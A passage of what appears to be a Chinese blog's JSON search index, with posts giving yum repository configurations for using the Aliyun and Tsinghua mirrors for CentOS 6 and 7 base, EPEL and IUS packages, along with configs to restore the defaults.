https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","CentOS","ius"]},{"title":"【国内镜像】CentOS 6 ius 清华镜像","url":"/mirror/centos-6-ius-tuna-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\nIUS（Inline with Upstream Stable）是一个社区项目，它旨在为 Linux 企业发行版提供可选软件的最新版 RPM 软件包。\n\n## 添加ius源\n\n```txt /etc/yum.repos.d/ius.repo\n[ius]\nname = IUS for Enterprise Linux 6 - $basearch\nbaseurl = https://mirrors.tuna.tsinghua.edu.cn/ius/6/$basearch/\nenabled = 1\nrepo_gpgcheck = 0\ngpgcheck = 1\ngpgkey = https://mirrors.tuna.tsinghua.edu.cn/ius/RPM-GPG-KEY-IUS-6\n\n[ius-debuginfo]\nname = IUS for Enterprise Linux 6 - $basearch - Debug\nbaseurl = https://mirrors.tuna.tsinghua.edu.cn/ius/6/$basearch/debug/\nenabled = 0\nrepo_gpgcheck = 0\ngpgcheck = 1\ngpgkey = https://mirrors.tuna.tsinghua.edu.cn/ius/RPM-GPG-KEY-IUS-6\n\n[ius-source]\nname = IUS for Enterprise Linux 6 - Source\nbaseurl = https://mirrors.tuna.tsinghua.edu.cn/ius/6/src/\nenabled = 0\nrepo_gpgcheck = 0\ngpgcheck = 1\ngpgkey = https://mirrors.tuna.tsinghua.edu.cn/ius/RPM-GPG-KEY-IUS-6\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","CentOS","ius"]},{"title":"【国内镜像】CentOS 6 清华镜像","url":"/mirror/centos-6-tuna-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\n## 替换镜像源\n\n```txt /etc/yum.repos.d/CentOS-Base.repo\n# CentOS-Base.repo\n#\n# The mirror system uses the connecting IP address of the client and the\n# update status of each mirror to pick mirrors that are updated to and\n# geographically close to the client.  You should use this for CentOS updates\n# unless you are manually picking other mirrors.\n#\n# If the mirrorlist= does not work for you, as a fall back you can try the\n# remarked out baseurl= line instead.\n#\n#\n\n\n[base]\nname=CentOS-$releasever - Base\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/os/$basearch/\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=os\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-6\n\n#released updates\n[updates]\nname=CentOS-$releasever - Updates\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/updates/$basearch/\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=updates\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-6\n\n\n\n#additional packages that may be useful\n[extras]\nname=CentOS-$releasever - Extras\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/extras/$basearch/\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=extras\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-6\n\n\n\n#additional packages that extend functionality of existing packages\n[centosplus]\nname=CentOS-$releasever - Plus\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/centosplus/$basearch/\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=centosplus\ngpgcheck=1\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-6\n\n\n#contrib - packages by Centos Users\n[contrib]\nname=CentOS-$releasever - Contrib\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/contrib/$basearch/\n#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=contrib\ngpgcheck=1\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-6\n```\n\n<!-- more -->\n\n## 恢复\n\n```txt /etc/yum.repos.d/CentOS-Base.repo\n# CentOS-Base.repo\n#\n# The mirror system uses the connecting IP address of the client and the\n# update status of each mirror to pick mirrors that are updated to and\n# geographically close to the client.  You should use this for CentOS updates\n# unless you are manually picking other mirrors.\n#\n# If the mirrorlist= does not work for you, as a fall back you can try the\n# remarked out baseurl= line instead.\n#\n#\n\n[base]\nname=CentOS-$releasever - Base\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=os&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/os/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6\n\n#released updates\n[updates]\nname=CentOS-$releasever - Updates\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=updates&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/updates/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6\n\n#additional packages that may be useful\n[extras]\nname=CentOS-$releasever - Extras\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=extras&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/extras/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6\n\n#additional packages that extend functionality of existing packages\n[centosplus]\nname=CentOS-$releasever - Plus\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=centosplus&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/centosplus/$basearch/\ngpgcheck=1\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6\n\n#contrib - packages by Centos Users\n[contrib]\nname=CentOS-$releasever - Contrib\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=contrib&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/contrib/$basearch/\ngpgcheck=1\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6\n```\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","CentOS"]},{"title":"【国内镜像】CentOS 7 阿里云镜像","url":"/mirror/centos-7-aliyun-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\n## 替换镜像源\n\n```txt /etc/yum.repos.d/CentOS-Base.repo\n# CentOS-Base.repo\n#\n# The mirror system uses the connecting IP address of the client and the\n# update status of each mirror to pick mirrors that are updated to and\n# geographically close to the client.  You should use this for CentOS updates\n# unless you are manually picking other mirrors.\n#\n# If the mirrorlist= does not work for you, as a fall back you can try the\n# remarked out baseurl= line instead.\n#\n#\n\n[base]\nname=CentOS-$releasever - Base - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/os/$basearch/\n        http://mirrors.aliyuncs.com/centos/$releasever/os/$basearch/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/os/$basearch/\ngpgcheck=1\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\n\n#released updates\n[updates]\nname=CentOS-$releasever - Updates - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/updates/$basearch/\n        http://mirrors.aliyuncs.com/centos/$releasever/updates/$basearch/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/updates/$basearch/\ngpgcheck=1\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\n\n#additional packages that may be useful\n[extras]\nname=CentOS-$releasever - Extras - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/extras/$basearch/\n        http://mirrors.aliyuncs.com/centos/$releasever/extras/$basearch/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/extras/$basearch/\ngpgcheck=1\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\n\n#additional packages that extend functionality of existing packages\n[centosplus]\nname=CentOS-$releasever - Plus - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/centosplus/$basearch/\n        http://mirrors.aliyuncs.com/centos/$releasever/centosplus/$basearch/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/centosplus/$basearch/\ngpgcheck=1\nenabled=0\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\n\n#contrib - packages by Centos Users\n[contrib]\nname=CentOS-$releasever - Contrib - mirrors.aliyun.com\nfailovermethod=priority\nbaseurl=http://mirrors.aliyun.com/centos/$releasever/contrib/$basearch/\n        http://mirrors.aliyuncs.com/centos/$releasever/contrib/$basearch/\n        http://mirrors.cloud.aliyuncs.com/centos/$releasever/contrib/$basearch/\ngpgcheck=1\nenabled=0\ngpgkey=http://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-7\n```\n\n<!-- more -->\n\n非阿里云ECS用户会出现 Couldn't resolve host 'mirrors.cloud.aliyuncs.com' 信息，不影响使用。用户也可自行修改相关配置: eg:\n\n```shell\nsed -i -e '/mirrors.cloud.aliyuncs.com/d' -e '/mirrors.aliyuncs.com/d' /etc/yum.repos.d/CentOS-Base.repo\n```\n\n## 恢复\n\n```txt /etc/yum.repos.d/CentOS-Base.repo\n# CentOS-Base.repo\n#\n# The mirror system uses the connecting IP address of the client and the\n# update status of each mirror to pick mirrors that are updated to and\n# geographically close to the client.  You should use this for CentOS updates\n# unless you are manually picking other mirrors.\n#\n# If the mirrorlist= does not work for you, as a fall back you can try the\n# remarked out baseurl= line instead.\n#\n#\n\n[base]\nname=CentOS-$releasever - Base\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=os&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/os/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7\n\n#released updates\n[updates]\nname=CentOS-$releasever - Updates\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=updates&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/updates/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7\n\n#additional packages that may be useful\n[extras]\nname=CentOS-$releasever - Extras\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=extras&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/extras/$basearch/\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7\n\n#additional packages that extend functionality of existing packages\n[centosplus]\nname=CentOS-$releasever - Plus\nmirrorlist=http://mirrorlist.centos.org/?release=$releasever&arch=$basearch&repo=centosplus&infra=$infra\n#baseurl=http://mirror.centos.org/centos/$releasever/centosplus/$basearch/\ngpgcheck=1\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","CentOS"]},{"title":"【国内镜像】CentOS 7 epel 阿里云镜像","url":"/mirror/centos-7-epel-aliyun-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\nEPEL(Extra Packages for Enterprise Linux)是由Fedora Special Interest Group维护的Enterprise Linux（RHEL、CentOS）中经 常用到的包。\n\n## 添加epel源\n\n```txt /etc/yum.repos.d/epel.repo\n[epel]\nname=Extra Packages for Enterprise Linux 7 - $basearch\nbaseurl=http://mirrors.aliyun.com/epel/7/$basearch\nfailovermethod=priority\nenabled=1\ngpgcheck=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7\n\n[epel-debuginfo]\nname=Extra Packages for Enterprise Linux 7 - $basearch - Debug\nbaseurl=http://mirrors.aliyun.com/epel/7/$basearch/debug\nfailovermethod=priority\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7\ngpgcheck=0\n\n[epel-source]\nname=Extra Packages for Enterprise Linux 7 - $basearch - Source\nbaseurl=http://mirrors.aliyun.com/epel/7/SRPMS\nfailovermethod=priority\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7\ngpgcheck=0\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","CentOS","epel"]},{"title":"【国内镜像】CentOS 7 epel 清华镜像","url":"/mirror/centos-7-epel-tuna-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\nEPEL(Extra Packages for Enterprise Linux)是由Fedora Special Interest Group维护的Enterprise Linux（RHEL、CentOS）中经 常用到的包。\n\n## 添加epel源\n\n```txt /etc/yum.repos.d/epel.repo\n[epel]\nname=Extra Packages for Enterprise Linux 7 - $basearch\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/epel/7/$basearch\nfailovermethod=priority\nenabled=1\ngpgcheck=1\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7\n\n[epel-debuginfo]\nname=Extra Packages for Enterprise Linux 7 - $basearch - Debug\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/epel/7/$basearch/debug\nfailovermethod=priority\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7\ngpgcheck=1\n\n[epel-source]\nname=Extra Packages for Enterprise Linux 7 - $basearch - Source\nbaseurl=https://mirrors.tuna.tsinghua.edu.cn/epel/7/SRPMS\nfailovermethod=priority\nenabled=0\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7\ngpgcheck=1\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/centos\n- https://developer.aliyun.com/mirror/epel\n- https://developer.aliyun.com/mirror/ius\n- https://mirrors.tuna.tsinghua.edu.cn/help/centos/\n- https://mirrors.tuna.tsinghua.edu.cn/help/epel/\n- [【国内镜像】CentOS 6 阿里云镜像](/mirror/centos-6-aliyun-mirror/)\n- [【国内镜像】CentOS 7 阿里云镜像](/mirror/centos-7-aliyun-mirror/)\n- [【国内镜像】CentOS 8 阿里云镜像](/mirror/centos-8-aliyun-mirror/)\n- [【国内镜像】CentOS 6 清华镜像](/mirror/centos-6-tuna-mirror/)\n- [【国内镜像】CentOS 7 清华镜像](/mirror/centos-7-tuna-mirror/)\n- [【国内镜像】CentOS 8 清华镜像](/mirror/centos-8-tuna-mirror/)\n- [【国内镜像】CentOS 6 epel 阿里云镜像](/mirror/centos-6-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 7 epel 阿里云镜像](/mirror/centos-7-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 8 epel 阿里云镜像](/mirror/centos-8-epel-aliyun-mirror/)\n- [【国内镜像】CentOS 6 epel 清华镜像](/mirror/centos-6-epel-tuna-mirror/)\n- [【国内镜像】CentOS 7 epel 清华镜像](/mirror/centos-7-epel-tuna-mirror/)\n- [【国内镜像】CentOS 8 epel 清华镜像](/mirror/centos-8-epel-tuna-mirror/)\n- [【国内镜像】CentOS 6 ius 阿里云镜像](/mirror/centos-6-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 7 ius 阿里云镜像](/mirror/centos-7-ius-aliyun-mirror/)\n- [【国内镜像】CentOS 6 ius 清华镜像](/mirror/centos-6-ius-tuna-mirror/)\n- [【国内镜像】CentOS 7 ius 清华镜像](/mirror/centos-7-ius-tuna-mirror/)\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","CentOS","epel"]},{"title":"【国内镜像】CentOS 7 ius 阿里云镜像","url":"/mirror/centos-7-ius-aliyun-mirror/","content":"\nCentOS Linux 是一个由社群支持的发行版本，它是由 Red Hat 或 CentOS git 公开的 Red Hat 企业级 Linux（RHEL）源代码所衍生出来的。因此，CentOS Linux 以兼容 RHEL 的功能为目标。CentOS 计划对组件的修改主要是去除上游提供者的商标及美工图。CentOS Linux 是免费的及可自由派发的。每个 CentOS 版本均获维护直至相等的 RHEL 版本支持被中止。新的 CentOS 版本会随著新版 RHEL 的出现而被重建 —— 次要版本约 6-12 个月发行一次，主要版本数年才发行一次。重建所需的时间由次要版本的数星期到主要版本的数月不等。这样做能创建一个安全、低维护、稳定、高预测性、高重复性的 Linux 环境。\n\nIUS（Inline with Upstream Stable）是一个社区项目，它旨在为 Linux 企业发行版提供可选软件的最新版 RPM 软件包。\n\n## 添加ius源\n\n```txt /etc/yum.repos.d/ius.repo\n[ius]\nname = IUS for Enterprise Linux 7 - $basearch\nbaseurl = https://mirrors.aliyun.com/ius/7/$basearch/\nenabled = 1\nrepo_gpgcheck = 0\ngpgcheck = 1\ngpgkey = https://mirrors.aliyun.com/ius/RPM-GPG-KEY-IUS-7\n\n[ius-debuginfo]\nname = IUS for Enterprise Linux 7 - $basearch - Debug\nbaseurl = https://mirrors.aliyun.com/ius/7/$basearch/debug/\nenabled = 0\nrepo_gpgcheck = 0\ngpgcheck = 1\ngpgkey = https://mirrors.aliyun.com/ius/RPM-GPG-KEY-IUS-7\n\n[ius-source]\nname = IUS for Enterprise Linux 7 - Source\nbaseurl = https://mirrors.aliyun.com/ius/7/src/\nenabled = 